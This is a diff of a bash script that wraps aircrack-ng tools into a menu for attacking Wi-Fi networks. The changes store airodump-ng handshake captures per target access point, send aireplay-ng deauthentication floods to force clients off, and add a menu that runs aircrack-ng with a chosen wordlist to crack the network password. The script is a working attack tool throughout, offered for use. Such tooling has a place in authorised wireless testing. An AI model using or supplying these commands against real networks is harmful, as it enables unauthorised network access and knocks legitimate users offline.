@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Directory to save .cap files
+capdir="${HOME}/airocap"
+mkdir -p ${capdir}
+
 usage() { echo "Usage: $0 [-m <1-4>]" 1>&2; exit 1; }
 
 echo -e "\e[0;31m
@@ -38,7 +42,7 @@ function main_menu {
     then
         echo -e "
 \e[1;34m1)\e[0m Scan networks
-\e[1;34m2)\e[0m Try a capture file with /usr/share/wordlists/rockyou.txt
+\e[1;34m2)\e[0m Try to crack wifi password
 \e[1;34m3)\e[0m Enable monitor mode
 \e[1;34m4)\e[0m Disable monitor mode
         \e[1;34mX)\e[0m Exit script\n"
@@ -65,9 +69,7 @@ function main_menu {
         1)
             scan_net
         ;;
-        2) echo -n "Path of .cap file : "
-            read cappath
-            aircrack-ng ${cappath} /usr/share/wordlists/rockyou.txt
+        2)  crack_menu
         ;;
         3) #airmon-ng check kill && airmon-ng start wlan0
             ip link set wlan0 down && airmon-ng start wlan0
@@ -159,13 +161,22 @@ attack_mode_menu() {
     
     read attackmode
     case ${attackmode} in
-        1) airodump-ng --bssid ${apmac} -c ${apchannel} -w ${apmac} ${imon}
+        1) capsave="${capdir}/${apmac}/"
+            mkdir -p ${capsave}
+            rm -f ${capsave}/*
+            airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
+            main_menu
         ;;
         2) iwconfig ${imon} channel ${apchannel}
             aireplay-ng -0 0 -a ${apmac} ${imon}
         ;;
-        3) iwconfig ${imon} channel ${apchannel}
-            gnome-terminal -- airodump-ng --bssid ${apmac} -c ${apchannel} -w ${apmac} ${imon} & aireplay-ng -0 30 -a ${apmac} ${imon}
+        3) echo "NOTE: To stop deauth, simply Ctrl+C in the popup terminal window."
+            capsave="${capdir}/${apmac}"
+            mkdir -p ${capsave}
+            rm -f ${capsave}/*
+            iwconfig ${imon} channel ${apchannel}
+            airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
+            gnome-terminal -- "aireplay-ng -0 30 -a ${apmac} ${imon} && sh"
         ;;
         X|x) echo "Bye !" && exit 1
         ;;
@@ -173,6 +184,31 @@ attack_mode_menu() {
         ;;
         
     esac
+}
+
+crack_menu (){
+    list=""
+    i=0
+    for dir in ${capdir}/*/; do
+        dir=${dir%*/}
+        list+="\e[1;34m${i})\e[0m ${dir##*/}"
+        [[ $i -eq 0 ]] && list+="         \e[3;34mrecent\e[0m"
+        list+=$'\n'
+        ((++i))
+    done
+    [[ -z $1 ]] && echo -e "${list}"
+    
+    echo -ne "\e[1mChoice : \e[0m"
+    read macchoice
+    if [ -z ${macchoice} ] || (( ${macchoice} >= ${i} )); then
+        echo -e "\e[1;31mInvalid choice\e[0m" && crack_menu false
+    fi
+    
+    selmac=$(echo -e "$list" | grep "${macchoice})" | grep -oE "([0-9a-fA-F]{2}:?){6}")
+    echo "Selected MAC: ${selmac}"
+    wordlist=$(zenity --file-selection --title="Select a wordlist" --file-filter="*.txt *.lst")
+    echo "${capdir}/${selmac}/*.cap" $wordlist
+    aircrack-ng "${capdir}/${selmac}/out-01.cap" -w "${wordlist}"
 }
 
 # Parse flags
